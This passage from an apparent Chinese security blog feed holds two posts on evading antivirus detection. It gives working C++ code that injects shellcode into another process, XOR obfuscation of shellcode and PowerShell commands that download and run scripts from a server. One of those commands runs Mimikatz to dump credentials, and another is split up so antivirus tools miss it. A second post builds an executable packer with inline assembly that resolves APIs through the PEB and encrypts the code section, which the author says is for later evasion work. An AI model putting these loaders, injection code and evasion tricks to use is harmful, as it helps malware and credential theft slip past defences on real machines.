class="line">&#125;</span><br></pre></td></tr></table></figure><p>大致流程便是:</p><p>1.通过winhttp中的函数，以HTTP的方法获取远程服务器上的shellcode（此时shellcode在内存中是按照编码结果存储的，如下图，左边是内存原文，右边是内存解码（shellcode））</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217145818.png" alt="QQ截图20210217145818"></p><p>2.开辟一段内存，然后通过sscanf等方法读取存储shellcode变量的内容，将内存解码信息录入新的内存空间,使shellcode存在于内存中<br>3.执行shellcode，可以用指针执行等方法执行。</p><h3 id="使用加载器加载shellcode"><a href="#使用加载器加载shellcode" class="headerlink" title="使用加载器加载shellcode"></a>使用加载器加载shellcode</h3><h4 id="shellcode-launcher-加载器"><a href="#shellcode-launcher-加载器" class="headerlink" title="shellcode_ launcher 加载器"></a>shellcode_ launcher 加载器</h4><p><a href="https://github.com/clinicallyinane/shellcode_launcher/">https://github.com/clinicallyinane/shellcode_launcher/</a></p><p>用msf或者cs生成raw形式shellcode，然后使用这个加载器加载一下就行了.<br>像这样 shellcode_launcher.exe -i C:\payload32.bin<br>shellcode_ launcher 在virustotal上报毒率也是很高很高了…</p><h4 id="SSI-加载器"><a href="#SSI-加载器" class="headerlink" title="SSI 加载器"></a>SSI 加载器</h4><p><a href="https://github.com/DimopoulosElias/SimpleShellcodeInjector">https://github.com/DimopoulosElias/SimpleShellcodeInjector</a></p><p> cs生成c形式shellcode，然后去除\x，再拿给ssi加载器加载,像这样</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217145832.png" alt="QQ截图20210217145832"></p><p>ssi.exe shellcode 即可完成加载</p><p>ssi在virustotal上报毒率也是非常高..</p><h4 id="自写加载器"><a href="#自写加载器" class="headerlink" title="自写加载器"></a>自写加载器</h4><p>ssi源码很简单大家可以参考写一下</p><h3 id="shellcode变形"><a href="#shellcode变形" class="headerlink" title="shellcode变形"></a>shellcode变形</h3><p>大思路就是把shellcode混淆后，放入加载器加载运行。<br>其细分思路就包括怎么把shellcode进行混淆了，简单的有XOR,BASE64，复杂一点的有AES等。<br>这里就只说说xor。<br>首先我们得准备一个程序将shellcode进行混淆。图方便就拿python写也是蛮不错的。<br>随便写了一个。效果真不戳（虽然上传了vt过两天就肯定不能用了)</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217145855.png" alt="QQ截图20210217145855"></p><p>github:<a href="https://github.com/ConsT27/SimpleXORshellcode">https://github.com/ConsT27/SimpleXORshellcode</a></p><h3 id="shellcode注入进程内存"><a href="#shellcode注入进程内存" class="headerlink" title="shellcode注入进程内存"></a>shellcode注入进程内存</h3><h4 id="注入已有进程"><a href="#注入已有进程" class="headerlink" title="注入已有进程"></a>注入已有进程</h4><p>大致逻辑:OpenProcess获得进程句柄-&gt;VirtualAllocEx在进程中开辟一段内存空间-&gt;WriteProcessMemory向刚刚开辟的内存空间中写入shellcode-&gt;CreateRemoteThread为刚刚写入的shellcode创建一个线程执行</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include&lt;Windows.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">unsigned char buf[] &#x3D; &quot;shellcode&quot;;</span><br><span class="line">DWORD pid &#x3D; 25388;</span><br><span class="line">HANDLE Proc &#x3D; OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);</span><br><span class="line">if (!Proc) &#123;</span><br><span class="line">std::cout &lt;&lt; GetLastError() &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">LPVOID buffer &#x3D; VirtualAllocEx(Proc, NULL, sizeof(buf), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);</span><br><span class="line">if (buffer) &#123;</span><br><span class="line">std::cout &lt;&lt; GetLastError() &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">if (WriteProcessMemory(Proc, buffer, buf, sizeof(buf), 0) )&#123;</span><br><span class="line">std::cout &lt;&lt; GetLastError() &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">HANDLE remotethread &#x3D; CreateRemoteThread(Proc, NULL, 0, (LPTHREAD_START_ROUTINE)buffer, 0, 0, 0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>效果:虽然也很拉，但是静态过了趋势是我没想到的。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217145906.png" alt="QQ截图20210217145906"></p><h2 id="Powershell"><a href="#Powershell" class="headerlink" title="Powershell"></a>Powershell</h2><h3 id="远程执行与本地执行"><a href="#远程执行与本地执行" class="headerlink" title="远程执行与本地执行"></a>远程执行与本地执行</h3><h4 id="远程执行"><a href="#远程执行" class="headerlink" title="远程执行"></a>远程执行</h4><p>powershell可以加载远程的ps1文件。这样做的好处是实现了无文件落地。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powershell &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;127.0.0.1&#x2F;Invoke-Mimikatz.ps1&#39;);Invoke-Mimikatz -DumpCreds&quot;</span><br></pre></td></tr></table></figure><p>不过市面上很多杀软对downloadstring检测十分十分严格(许多会检测远程文件安全性）</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powershell -exec bypass -f \\webdavserver\folder\payload.ps1 (smb)</span><br></pre></td></tr></table></figure><h4 id="本地执行"><a href="#本地执行" class="headerlink" title="本地执行"></a>本地执行</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powershell Import-Module .\xx.ps1</span><br></pre></td></tr></table></figure><h3 id="命令拆分"><a href="#命令拆分" class="headerlink" title="命令拆分"></a>命令拆分</h3><p>就像刚刚远程加载的downloadstring法，它很容易被杀软拦截。但是我们可以通过拆分重组绕过一些杀软检测。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powershell -c &quot;$c1&#x3D;&#39;IEX(New-Object Net.WebClient).Downlo&#39;;$c2&#x3D;&#39;123(&#39;&#39;http:&#x2F;&#x2F;webserver&#x2F;xxx.ps1&#39;&#39;)&#39;.Replace(&#39;123&#39;,&#39;adString&#39;);IEX ($c1+$c2)&quot;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;前面的话:”免杀一般都是靠组合拳”&lt;/p&gt;
&lt;h2 id=&quot;EXE&quot;&gt;&lt;a href=&quot;#EXE&quot; class=&quot;headerlink&quot; title=&quot;EXE&quot;&gt;&lt;/a&gt;EXE&lt;/h2&gt;&lt;h3 id=&quot;加壳&quot;&gt;&lt;a href=&quot;#加壳&quot; class=&quot;headerlink&quot;</summary>
      
    
    
    
    
    <category term="免杀" scheme="http://const27.com/tags/%E5%85%8D%E6%9D%80/"/>
    
  </entry>
  
  <entry>
    <title>C++结合内联汇编编写一个加壳程序</title>
    <link href="http://const27.com/2021/02/19/C++%E7%BB%93%E5%90%88%E5%86%85%E8%81%94%E6%B1%87%E7%BC%96%E7%BC%96%E5%86%99%E4%B8%80%E4%B8%AA%E5%8A%A0%E5%A3%B3%E7%A8%8B%E5%BA%8F/"/>
    <id>http://const27.com/2021/02/19/C++%E7%BB%93%E5%90%88%E5%86%85%E8%81%94%E6%B1%87%E7%BC%96%E7%BC%96%E5%86%99%E4%B8%80%E4%B8%AA%E5%8A%A0%E5%A3%B3%E7%A8%8B%E5%BA%8F/</id>
    <published>2021-02-19T09:21:55.758Z</published>
    <updated>2021-02-19T08:51:10.308Z</updated>
    
    <content type="html"><![CDATA[<p>参考:<a href="https://blog.csdn.net/qq_31507523/article/details/89438410">https://blog.csdn.net/qq_31507523/article/details/89438410</a></p><p>学习一下写壳，在以后免杀中使用。</p><h2 id="加壳原理"><a href="#加壳原理" class="headerlink" title="加壳原理"></a>加壳原理</h2><h3 id="手工加壳"><a href="#手工加壳" class="headerlink" title="手工加壳"></a>手工加壳</h3><p>用010editor手工加壳了解一波原理。加壳原理大致如下</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217144840.png" alt="QQ截图20210217144840"></p><p>即我们向PE文件添加一个区段并将其设置为入口点，这样PE文件最开始执行的命令就是我们添加的区段也就是壳的指令，壳对加密区进行解密，对压缩区进行解压，将原本的EXE文件还原出来，然后跳转至原程序入口，程序照常运行。</p><p>首先生成一个打印hello的exe文件。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">printf(&quot;hello&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们目前要干的事情是:以手动的形式向PE文件添加一个壳部分并设为程序入口，并使其能跳转回原入口。<br>那就来吧</p><p>用010editor打开我们的exe文件，启用exe模板分析。<br>我们首先修改其文件头numverofsection属性，这个属性用来定义当前PE文件存在多少个区段,因为我们要添加一个壳区段，所以我们将其加1变成6</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217144857.png" alt="QQ截图20210217144857"></p><p>在我们重载模板后我们就会在区段表发现多出来一个空的区段表</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217144908.png" alt="QQ截图20210217144908"></p><p>从上到下各个比较重要字段的意思是<br>\1. Name 表示该区段的名字<br>2.VirtualSize 表示在内存中的大小(一般内存对齐为0x1000)<br>3.virtualaddress 虚拟地址 即上一个区段的VirtualAddress + 上一个区段经内存对齐粒度对齐后的大小<br>4.sizeofdata 表示在文件中的大小（一般文件对齐为0x200)<br>5.pointertorawdata 文件的偏移 即 上一个区段的PointerToRawData + 上一个区段的SizeOfRawData</p><p>然后我们通过修改以上各值来定义一个新区段（壳区段)的属性</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217144928.png" alt="QQ截图20210217144928"></p><p>这里的virtualsize看着填一个就行了。<br>此时我们只是定义了区段表，但文件中并没有该区段存在，所以我们得创建该区段。<br>然后还要让区段可编辑，把下列值改为1即可</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217144950.png" alt="QQ截图20210217144950"></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217145000.png" alt="QQ截图20210217145000"></p><p>ctrl+shift+i 向目标文件偏移处插入0x200大小的空间。<br>这样一来，壳区段就创建好了。 然后我们还要修改 扩展头的SizeofImage 。将他改为最后一个区段的内存地址+内存大小</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217145029.png" alt="QQ截图20210217145029"></p><p>然后去掉随机基址选项。</p><p>找到扩展头的DLL属性字段，去掉随机基址，把40 81改为 00 81</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217145042.png" alt="QQ截图20210217145042"></p><p>接下来我们把程序入口点设置给壳区段。<br>使用LORDPE把入口点设为壳区块的虚拟地址</p><p>然后我们用OD打开这个文件</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217145116.png" alt="QQ截图20210217145116"></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217145128.png" alt="QQ截图20210217145128"></p><h3 id="真正的加壳流程"><a href="#真正的加壳流程" class="headerlink" title="真正的加壳流程"></a>真正的加壳流程</h3><p>刚刚提到的手工加壳，不过是最最基础的加壳原型而已，真正的加壳还涉及了代码加解密等操作.</p><p>真正写壳时一般写两个东西，加壳器和stub<br>所谓加壳器，就是给被加壳文件创造出一个新的区段， 在此同时将程序以某种方式加密，然后把stub放入新区段，并将程序入口点设为新区段的地址，然后在新区段结束后跳转回原程序入口。这个新区段我们叫做壳区段.<br>那么这个stub就是加壳后程序最先执行的命令了，它执行解密算法，将原程序释放出来。</p><h2 id="基于c-的壳编写"><a href="#基于c-的壳编写" class="headerlink" title="基于c++的壳编写"></a>基于c++的壳编写</h2><p>实现了一个薛定谔的加壳器（雾）<br>加壳好的程序有一定几率运行不了，原因未知。。</p><p><a href="https://github.com/ConsT27/PackingEXE/tree/master">https://github.com/ConsT27/PackingEXE/tree/master</a> 👈项目地址</p><p>很大一部分上是借鉴这个老哥的<br><a href="https://github.com/TonyChen56/GuiShou_Pack">https://github.com/TonyChen56/GuiShou_Pack</a></p><p>第一次接触汇编编程，c++编程，上来就是搞这么一个项目，搞了快两个星期，确实有点痛苦，到现在还有很大部分不是很懂的地方（比如许多数据类型以及底层汇编（笑😁<br>这个项目也存在bug，也就是刚刚说的程序有几率不能运行的问题。😡<br>但是也学到了挺多，比如PEB动态寻址，PE文件结构等等。😁<br>苦于网上没有一篇文章详细的交代了技术的细节，所以这篇文章会尽可能的详细。<br>接下来是各个流程的详细实现方法，至于怎么把各个流程链接起来，师傅们可以通过下载上面提到的两个项目来看一下。</p><h3 id="Stub"><a href="#Stub" class="headerlink" title="Stub"></a>Stub</h3><p>stub是被植入到PE文件中的代码，它一般会干下面这些事情。</p><p>流程如下</p><p>0.合并data，rdata到text<br>1.PEB动态寻址，遍历导出表找到GetProcAddress函数<br>2.解密<br>3.修改入口点到原入口点</p><p>同时stub一般以dll的形式存在。原因是DLL通常自带重定位表，这在我们的移植过程中的重定位操作中提供了巨大的便利。</p><h4 id="合并数据段"><a href="#合并数据段" class="headerlink" title="合并数据段"></a>合并数据段</h4><p>我们要移植stub过去，肯定需要移植代码段，也需要移植数据段。不如我们干脆把数据段合并到代码段，一块移植过去。</p><h4 id="PEB动态寻址-amp-导出表遍历找函数"><a href="#PEB动态寻址-amp-导出表遍历找函数" class="headerlink" title="PEB动态寻址&amp;导出表遍历找函数"></a>PEB动态寻址&amp;导出表遍历找函数</h4><p>为什么会用到这个技术编写stub？<br>因为我们的stub.dll植入到宿主程序时，只有.text植入过去，没有对应的导入表，所以我们的stub无法直接调用一些API。所以我们需要动态获取各种API。<br>其中我采用的是PEB动态查询得到GetProcAddress函数，然后用GetProcAddress函数去获取各个API。</p><p>那么，什么是PEB？<br>PEB是一个微软还未完全公开作用的一个结构，它叫做 进程环境信息块 ，包含了进程的信息。其结构如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">typedef struct _PEB &#123;</span><br><span class="line">  BYTE                          Reserved1[2];</span><br><span class="line">  BYTE                          BeingDebugged; &#x2F;&#x2F;被调试状态</span><br><span class="line">  BYTE                          Reserved2[1];</span><br><span class="line">  PVOID                         Reserved3[2];</span><br><span class="line">  PPEB_LDR_DATA                 Ldr;</span><br><span class="line">  PRTL_USER_PROCESS_PARAMETERS  ProcessParameters;</span><br><span class="line">  BYTE                          Reserved4[104];</span><br><span class="line">  PVOID                         Reserved5[52];</span><br><span class="line">  PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine;</span><br><span class="line">  BYTE                          Reserved6[128];</span><br><span class="line">  PVOID                         Reserved7[1];</span><br><span class="line">  ULONG                         SessionId;</span><br><span class="line">&#125; PEB, *PPEB;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>我们关心的是PEB偏移0c得到的 PPEB_LDR_DATA Ldr; 它是一个指针，指向一个 PPEB_LDR_DATA 结构， 存放着已经被进程装在的动态链接库的信息</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">typedef struct _PEB_LDR_DATA</span><br><span class="line">&#123;</span><br><span class="line">　ULONG Length; &#x2F;&#x2F; +0x00</span><br><span class="line">　BOOLEAN Initialized; &#x2F;&#x2F; +0x04</span><br><span class="line">　PVOID SsHandle; &#x2F;&#x2F; +0x08</span><br><span class="line">　LIST_ENTRY InLoadOrderModuleList; &#x2F;&#x2F; +0x0c</span><br><span class="line">　LIST_ENTRY InMemoryOrderModuleList; &#x2F;&#x2F; +0x14</span><br><span class="line">　LIST_ENTRY InInitializationOrderModuleList;&#x2F;&#x2F; +0x1c</span><br><span class="line">&#125; PEB_LDR_DATA,*PPEB_LDR_DATA; &#x2F;&#x2F; +0x24</span><br></pre></td></tr></table></figure><p>PPEB_LDR_DATA 偏移1c是一个指向LIST_ENTRY InInitializationOrderModuleList结构的指针，这个结构 存放着指向模块初始化链表的头 ， 按顺序存放着PE装入运行时初始化模块信息，一般来说第一个链表结点是ntdll.dll,第二个链表结点就是kernel32.dll 。我们就在其中找到kernel32.dll的信息，获取其PE信息，得到导出表，循环遍历得到GetProcAddress函数。<br>另外，PEB地址再TEB偏移0x30处。用汇编语言表示就是 fs:[0x30]。</p><p>以上是PEB寻址的大致流程，另外还有一个比较关键的点是遍历kernel32.dll导出表获得GetProcAddress函数信息。<br>关于导出表可以看看这个文章<a href="https://blog.csdn.net/evileagle/article/details/12176797">https://blog.csdn.net/evileagle/article/details/12176797</a></p><p>首先一个导出表结构体如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">typedef struct _IMAGE_EXPORT_DIRECTORY &#123;</span><br><span class="line">    DWORD   Characteristics;  &#x2F;&#x2F;一般为0，没啥用</span><br><span class="line">    DWORD   TimeDateStamp;  &#x2F;&#x2F;导出表生成的时间</span><br><span class="line">    WORD    MajorVersion;  &#x2F;&#x2F;版本，也是0没啥用</span><br><span class="line">    WORD    MinorVersion;  &#x2F;&#x2F;也是没啥用的版本信息一般为0</span><br><span class="line">    DWORD   Name;  &#x2F;&#x2F;当前导出表的模块名字</span><br><span class="line">    DWORD   Base;  &#x2F;&#x2F;序号表中序号的基数</span><br><span class="line">    DWORD   NumberOfFunctions;  &#x2F;&#x2F;导出函数数量</span><br><span class="line">    DWORD   NumberOfNames;  &#x2F;&#x2F;按名字导出函数的数量</span><br><span class="line">    DWORD   AddressOfFunctions;     &#x2F;&#x2F; 序号表</span><br><span class="line">    DWORD   AddressOfNames;         &#x2F;&#x2F; 名称表</span><br><span class="line">    DWORD   AddressOfNameOrdinals;  &#x2F;&#x2F; 地址表</span><br><span class="line">&#125; IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;</span><br></pre></td></tr></table></figure><p>其中序号表的起始序号是Base属性定义的值。以下是导出表的序号名称地址表的关系</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217145159.png" alt="QQ截图20210217145159"></p><p>我们的遍历流程是，先遍历名称表找到GetProcAddress在名称数组中的下标，然后根据这个下标去序号数组中找相同下标的序号值，然后以这个序号值为下标去找地址数组中的对应值。我们找到的地址表中的值就是函数入口</p><p>下面我把这段程序的汇编代码放出来。我是用内联汇编把这段代码塞进C++的</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void GetApis()</span><br><span class="line">&#123;</span><br><span class="line">HMODULE hKernel32;</span><br><span class="line"></span><br><span class="line">_asm</span><br><span class="line">&#123;</span><br><span class="line">pushad;</span><br><span class="line">; &#x2F;&#x2F;获取kernel32.dll的加载基址;</span><br><span class="line">mov eax, fs: [0x30] ;  &#x2F;&#x2F;得到PEB地址</span><br><span class="line">mov eax, [eax + 0ch];  &#x2F;&#x2F;获得LDR_PEB_DATA地址</span><br><span class="line">mov eax, [eax + 0ch];  &#x2F;&#x2F;获得LIST_ENTRY InLoadOrderModuleList;地址</span><br><span class="line">mov eax, [eax];  &#x2F;&#x2F;获得LIST_ENTRY InLoadOrderModuleList下一项的地址</span><br><span class="line">mov eax, [eax];  &#x2F;获得LIST_ENTRY InLoadOrderModuleList下下项即我们需要的LIST_ENTRY InInitializationOrderModuleList的地址</span><br><span class="line">mov eax, [eax + 018h]; &#x2F;&#x2F;获得kernel32.dll地址</span><br><span class="line">mov hKernel32, eax;</span><br><span class="line">mov ebx, [eax + 03ch];&#x2F;&#x2F;获得kernel32.dll NT头RVA</span><br><span class="line">add ebx, eax; &#x2F;&#x2F;NT头的VA</span><br><span class="line">add ebx, 078h; &#x2F;&#x2F;获得区段表</span><br><span class="line">mov ebx, [ebx]; &#x2F;&#x2F;获得导出表RVA</span><br><span class="line">add ebx, eax;  &#x2F;&#x2F;导出表VA</span><br><span class="line">lea ecx, [ebx + 020h];  </span><br><span class="line">mov ecx, [ecx]; &#x2F;&#x2F; ecx &#x3D;&gt; 名称表的首地址(rva);</span><br><span class="line">add ecx, eax; &#x2F;&#x2F; ecx &#x3D;&gt; 名称表的首地址(va);</span><br><span class="line">xor edx, edx; &#x2F;&#x2F; 作为索引(index)来使用.</span><br><span class="line">_WHILE:;</span><br><span class="line">mov esi, [ecx + edx * 4];&#x2F;&#x2F;名称数组入口点rva，名称数组单位大小4字节</span><br><span class="line">lea esi, [esi + eax];  &#x2F;&#x2F;入口点VA</span><br><span class="line">cmp dword ptr[esi], 050746547h;   &#x2F;&#x2F;进行名称匹配，050746547h即小端存储的GetP</span><br><span class="line">jne _LOOP;&#x2F;&#x2F;不相等就跳入_LOOP段</span><br><span class="line">cmp dword ptr[esi + 4], 041636f72h; &#x2F;&#x2F;名陈匹配，rocA，以下依次为ddre，ss</span><br><span class="line">jne _LOOP;</span><br><span class="line">cmp dword ptr[esi + 8], 065726464h;</span><br><span class="line">jne _LOOP;</span><br><span class="line">cmp word  ptr[esi + 0ch], 07373h;</span><br><span class="line">jne _LOOP;</span><br><span class="line">mov edi, [ebx + 024h]; </span><br><span class="line">add edi, eax;  &#x2F;&#x2F;获得序号表VA</span><br><span class="line"></span><br><span class="line">mov di, [edi + edx * 2];  &#x2F;&#x2F;获得序号数组中对应下标的地址，序号数组单位大小2字节</span><br><span class="line">and edi, 0FFFFh;  &#x2F;&#x2F;给di提位到32位，即给予edi 序号表中对应下标的地址</span><br><span class="line">mov edx, [ebx + 01ch];  </span><br><span class="line">add edx, eax;  &#x2F;&#x2F;获得地址表</span><br><span class="line">mov edi, [edx + edi * 4];  &#x2F;&#x2F;获得地址数组中，序号对应的值，地址数组单位大小4字节</span><br><span class="line">add edi, eax;   &#x2F;&#x2F;获得GetProcAddress的入口地址</span><br><span class="line">mov MyGetProcAddress, edi;  &#x2F;&#x2F;赋值</span><br><span class="line">jmp _ENDWHILE;  &#x2F;&#x2F;END</span><br><span class="line">_LOOP:;</span><br><span class="line">inc edx; &#x2F;&#x2F; ++index;</span><br><span class="line">jmp _WHILE;</span><br><span class="line">_ENDWHILE:;</span><br><span class="line">popad;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h4><p>解密代码段。这段好写。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void Decrypt()</span><br><span class="line">&#123;</span><br><span class="line">unsigned char* pText &#x3D; (unsigned char*)g_conf.textScnRVA + 0x400000;&#x2F;&#x2F;锁定到PE文件的text段（因为加壳时去掉了基址随机化，所以自信的把基址填成0x400000</span><br><span class="line"></span><br><span class="line">DWORD old &#x3D; 0;</span><br><span class="line">MyVirtualProtect(pText, g_conf.textScnSize, PAGE_READWRITE, &amp;old);&#x2F;&#x2F;修改代码段的属性,注意我们这里使用了动态获得的</span><br><span class="line">&#x2F;&#x2F;解密代码段</span><br><span class="line">for (DWORD i &#x3D; 0; i &lt; g_conf.textScnSize; i++)</span><br><span class="line">&#123;</span><br><span class="line">pText[i] ^&#x3D; g_conf.key;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;把属性修改回去</span><br><span class="line">MyVirtualProtect(pText, g_conf.textScnSize, old, &amp;old);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="修改入口点"><a href="#修改入口点" class="headerlink" title="修改入口点"></a>修改入口点</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">_asm</span><br><span class="line">&#123;</span><br><span class="line">mov eax, g_conf.srcOep;  &#x2F;&#x2F;入口点是g_conf.srcOep</span><br><span class="line">add eax, 0x400000</span><br><span class="line">jmp eax</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="加壳器"><a href="#加壳器" class="headerlink" title="加壳器"></a>加壳器</h3><p>加壳器流程如下</p><p>1.打开需要被加壳的PE文件<br>2.加载stub<br>3.加密代码段<br>4.添加新区段<br>5.stub重定位修复<br>6.stub移植<br>7.PE文件入口点修改<br>8.去随机基址<br>9.保存文件</p><p>以下的各个流程描述中会用到诸多自定义函数，我先贴上来吧。</p><h4 id="诸多自定函数-amp-结构体"><a href="#诸多自定函数-amp-结构体" class="headerlink" title="诸多自定函数&amp;结构体"></a>诸多自定函数&amp;结构体</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;****************</span><br><span class="line">&#x2F;&#x2F;对齐处理</span><br><span class="line">&#x2F;&#x2F;time:2020&#x2F;11&#x2F;5</span><br><span class="line">&#x2F;&#x2F;****************</span><br><span class="line">int AlignMent(_In_ int size, _In_ int alignment) &#123;</span><br><span class="line">return (size) % (alignment)&#x3D;&#x3D;0 ? (size) : ((size) &#x2F; alignment+1) * (alignment);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;***********************</span><br><span class="line">&#x2F;&#x2F;PE信息获取函数簇</span><br><span class="line">&#x2F;&#x2F;time:2020&#x2F;11&#x2F;2</span><br><span class="line">&#x2F;&#x2F;***********************</span><br><span class="line">PIMAGE_DOS_HEADER GetDosHeader(_In_ char* pBase) &#123;</span><br><span class="line">return PIMAGE_DOS_HEADER(pBase);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PIMAGE_NT_HEADERS GetNtHeader(_In_ char* pBase) &#123;</span><br><span class="line">return PIMAGE_NT_HEADERS(GetDosHeader(pBase)-&gt;e_lfanew+(SIZE_T)pBase);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PIMAGE_FILE_HEADER GetFileHeader(_In_ char* pBase) &#123;</span><br><span class="line">return &amp;(GetNtHeader(pBase)-&gt;FileHeader);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PIMAGE_OPTIONAL_HEADER32 GetOptHeader(_In_ char* pBase) &#123;</span><br><span class="line">return &amp;(GetNtHeader(pBase)-&gt;OptionalHeader);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PIMAGE_SECTION_HEADER GetLastSec(_In_ char* pBase) &#123;</span><br><span class="line">DWORD SecNum &#x3D; GetFileHeader(pBase)-&gt;NumberOfSections;</span><br><span class="line">PIMAGE_SECTION_HEADER FirstSec &#x3D; IMAGE_FIRST_SECTION(GetNtHeader(pBase));</span><br><span class="line">PIMAGE_SECTION_HEADER LastSec &#x3D; FirstSec + SecNum - 1;</span><br><span class="line">return LastSec;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PIMAGE_SECTION_HEADER GetSecByName(_In_ char* pBase,_In_ const char* name) &#123;</span><br><span class="line">DWORD Secnum &#x3D; GetFileHeader(pBase)-&gt;NumberOfSections;</span><br><span class="line">PIMAGE_SECTION_HEADER Section &#x3D; IMAGE_FIRST_SECTION(GetNtHeader(pBase));</span><br><span class="line">char buf[10] &#x3D; &#123; 0 &#125;;</span><br><span class="line">for (DWORD i &#x3D; 0; i &lt; Secnum; i++) &#123;</span><br><span class="line">memcpy_s(buf, 8, (char*)Section[i].Name, 8);</span><br><span class="line">if (!strcmp(buf, name)) &#123;</span><br><span class="line">return Section + i;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">return nullptr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">typedef struct _StubConf</span><br><span class="line">&#123;</span><br><span class="line">DWORD srcOep;&#x2F;&#x2F;入口点</span><br><span class="line">DWORD textScnRVA;&#x2F;&#x2F;代码段RVA</span><br><span class="line">DWORD textScnSize;&#x2F;&#x2F;代码段的大小</span><br><span class="line">DWORD key;&#x2F;&#x2F;解密密钥</span><br><span class="line">&#125;StubConf;</span><br><span class="line"></span><br><span class="line">struct StubInfo</span><br><span class="line">&#123;</span><br><span class="line">char* dllbase;&#x2F;&#x2F;stub.dll的加载基址</span><br><span class="line">DWORD pfnStart;&#x2F;&#x2F;stub.dll(start)导出函数的地址</span><br><span class="line">StubConf* pStubConf;&#x2F;&#x2F;stub.dll(g_conf)导出全局变量的地址</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="打开PE文件"><a href="#打开PE文件" class="headerlink" title="打开PE文件"></a>打开PE文件</h4><p>这里采用的方法是利用CreateFileA函数。同时这个函数还抛出了一个指向PE文件大小的指针</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">char* GetFileHmoudle(_In_ const char* path,_Out_opt_ DWORD* nFileSize) &#123;</span><br><span class="line">&#x2F;&#x2F;打开一个文件并获得文件句柄</span><br><span class="line">HANDLE hFile &#x3D; CreateFileA(path,</span><br><span class="line">GENERIC_READ,</span><br><span class="line">FILE_SHARE_READ,</span><br><span class="line">NULL,</span><br><span class="line">OPEN_ALWAYS,</span><br><span class="line">FILE_ATTRIBUTE_NORMAL,</span><br><span class="line">NULL);</span><br><span class="line">&#x2F;&#x2F;获得文件大小</span><br><span class="line">DWORD FileSize &#x3D; GetFileSize(hFile, NULL);</span><br><span class="line">&#x2F;&#x2F;返回文件大小到变量nFileSize</span><br><span class="line">if(nFileSize)</span><br><span class="line">*nFileSize &#x3D; FileSize;</span><br><span class="line">&#x2F;&#x2F;申请一片大小为FileSize的内存并将指针置于首位</span><br><span class="line">char* pFileBuf &#x3D; new 